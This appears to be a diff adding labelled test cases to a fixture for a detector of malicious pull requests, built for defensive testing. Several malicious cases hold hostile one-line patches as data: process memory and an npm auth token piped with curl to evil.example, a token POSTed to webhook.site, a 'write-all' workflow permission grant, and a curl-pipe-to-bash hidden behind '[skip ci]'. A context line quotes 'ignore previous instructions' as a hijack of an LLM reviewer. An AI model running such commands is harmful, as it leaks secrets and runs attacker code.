@@ -186,6 +186,131 @@
            "patch": "+Attackers write 'ignore previous instructions' to hijack an LLM reviewer.\n"}
         ]
       }
+    },
+    {
+      "name": "proc_mem_secret_dump",
+      "kind": "malicious",
+      "family": "data-exfiltration",
+      "key_rule": "data-exfiltration",
+      "expected_signal": true,
+      "expected_rules": ["data-exfiltration"],
+      "event": {
+        "repo": "acme/widgets", "kind": "pull_request", "number": 201, "author": "drive-by-9f",
+        "title": "perf: speed up the build", "body": "Minor build tweak.",
+        "files": [
+          {"filename": "scripts/collect.sh", "status": "modified", "additions": 1, "deletions": 0,
+           "patch": "+dd if=/proc/1337/mem bs=1 count=4096 2>/dev/null | curl -s --data-binary @- https://evil.example/m\n"}
+        ]
+      }
+    },
+    {
+      "name": "node_auth_token_exfil",
+      "kind": "malicious",
+      "family": "data-exfiltration",
+      "key_rule": "data-exfiltration",
+      "expected_signal": true,
+      "expected_rules": ["data-exfiltration"],
+      "event": {
+        "repo": "acme/widgets", "kind": "pull_request", "number": 202, "author": "drive-by-9f",
+        "title": "ci: tidy publish step", "body": "Cleanup.",
+        "files": [
+          {"filename": "scripts/publish.sh", "status": "modified", "additions": 1, "deletions": 0,
+           "patch": "+echo \"$NODE_AUTH_TOKEN\" | curl -s -d @- https://evil.example/c\n"}
+        ]
+      }
+    },
+    {
+      "name": "exfil_service_callback",
+      "kind": "malicious",
+      "family": "exfil-infrastructure",
+      "key_rule": "exfil-infrastructure",
+      "expected_signal": true,
+      "expected_rules": ["exfil-infrastructure"],
+      "event": {
+        "repo": "acme/widgets", "kind": "pull_request", "number": 203, "author": "drive-by-9f",
+        "title": "feat: add telemetry", "body": "Adds a small telemetry ping.",
+        "files": [
+          {"filename": "src/index.js", "status": "modified", "additions": 1, "deletions": 0,
+           "patch": "+fetch(\"https://webhook.site/9c2a-abc\", { method: \"POST\", body: token });\n"}
+        ]
+      }
+    },
+    {
+      "name": "workflow_write_all_escalation",
+      "kind": "malicious",
+      "family": "permission-escalation",
+      "key_rule": "workflow-permission-escalation",
+      "expected_signal": true,
+      "expected_rules": ["workflow-permission-escalation", "workflow-tamper"],
+      "event": {
+        "repo": "acme/widgets", "kind": "pull_request", "number": 204, "author": "drive-by-9f",
+        "title": "ci: adjust release permissions", "body": "Release needs broader perms.",
+        "files": [
+          {"filename": ".github/workflows/release.yml", "status": "modified", "additions": 1, "deletions": 0,
+           "patch": "+permissions: write-all\n"}
+        ]
+      }
+    },
+    {
+      "name": "skip_ci_masks_payload",
+      "kind": "malicious",
+      "family": "ci-bypass-masked-payload",
+      "key_rule": "curl-pipe-shell",
+      "expected_signal": true,
+      "expected_rules": ["ci-bypass", "curl-pipe-shell"],
+      "event": {
+        "repo": "acme/widgets", "kind": "pull_request", "number": 205, "author": "drive-by-9f",
+        "title": "chore: tidy logs [skip ci]", "body": "Log cleanup.",
+        "files": [
+          {"filename": "scripts/setup.sh", "status": "modified", "additions": 1, "deletions": 0,
+           "patch": "+curl -sSL https://evil.example/x | bash\n"}
+        ]
+      }
+    },
+    {
+      "name": "skip_ci_docs_only",
+      "kind": "benign",
+      "family": "legit-ci-skip",
+      "expected_signal": false,
+      "expected_rules": ["ci-bypass"],
+      "event": {
+        "repo": "acme/docs-site", "kind": "pull_request", "number": 206, "author": "regular-dev",
+        "title": "docs: fix typo [skip ci]", "body": "One-line doc fix.",
+        "files": [
+          {"filename": "README.md", "status": "modified", "additions": 1, "deletions": 0,
+           "patch": "+Corrected a small typo in the setup section.\n"}
+        ]
+      }
+    },
+    {
+      "name": "workflow_perms_hardening",
+      "kind": "benign",
+      "family": "legit-workflow-edit",
+      "expected_signal": false,
+      "expected_rules": ["workflow-tamper"],
+      "event": {
+        "repo": "acme/widgets", "kind": "pull_request", "number": 207, "author": "alice",
+        "title": "harden release workflow permissions", "body": "Drop the broad grant.",
+        "files": [
+          {"filename": ".github/workflows/release.yml", "status": "modified", "additions": 2, "deletions": 1,
+           "patch": "-permissions: write-all\n+permissions:\n+  contents: read\n"}
+        ]
+      }
+    },
+    {
+      "name": "dev_tunnel_in_docs",
+      "kind": "benign",
+      "family": "legit-webhook-dev-docs",
+      "expected_signal": false,
+      "expected_rules": ["dev-tunnel-endpoint"],
+      "event": {
+        "repo": "acme/probot-app", "kind": "pull_request", "number": 208, "author": "regular-dev",
+        "title": "docs: local webhook testing", "body": "How to test webhooks locally.",
+        "files": [
+          {"filename": "README.md", "status": "modified", "additions": 1, "deletions": 0,
+           "patch": "+Visit https://smee.io/new and run a tunnel at https://abc123.ngrok.io for local testing.\n"}
+        ]
+      }
     }
   ]
 }
